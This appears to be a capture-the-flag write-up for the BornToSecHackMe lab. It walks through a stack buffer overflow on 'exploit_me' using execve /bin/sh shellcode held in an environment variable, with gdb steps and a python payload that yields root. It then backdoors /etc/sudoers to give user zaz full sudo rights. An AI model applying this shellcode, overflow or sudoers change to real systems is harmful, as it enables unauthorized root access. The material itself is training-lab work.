aonus 3 - Buffer Overflow

Similar to Return2libc attack, except that instead of pointing to /bin/sh, we will point to our own shellcode.

export SHELLCODE=`perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`

````bash
gdb exploit_me
(gdb) b *main
(gdb) r
(gdb) x/s *((char **)environ+0)

(gdb)  x/50xg 0xbffff8a3

0xbffff8a3:	0x444f434c4c454853	0x9090909090903d45
0xbffff8b3:	0x9090909090909090	0x9090909090909090
0xbffff8c3:	0x9090909090909090	0x310876895e1feb90
0xbffff8d3:	0xb00c4689074688c0	0x568d084e8df3890b
….
````

=> we take 0xbffff8b3
````bash
$> ./exploit_me $(python -c 'print "i"*140 + "\xb3\xf8\xff\xbf"')
````
=> we are root

Pour donner tous les privileges à zaz, on peut modifier les droits du fichier /etc/sudoers :
````bash
$ chmod 666 /etc/sudoers
````
Modifications du fichier :
````bash
[...]
16 # Cmnd alias specification
17
18 # User privilege specification
19 root    ALL=(ALL:ALL) ALL
20 zaz     ALL=(ALL:ALL) ALL
21
22 # Members of the admin group may gain root privileges
23 %admin ALL=(ALL) ALL
[...]
````
````bash
$> chmod 440 /etc/sudoers
````
````bash
$>sudo su
$>[sudo] password for zaz:
$>root@BornToSecHackMe:/home/zaz# id
$>uid=0(root) gid=0(root) groups=0(root)
````

https://beta.hackndo.com/buffer-overflow/
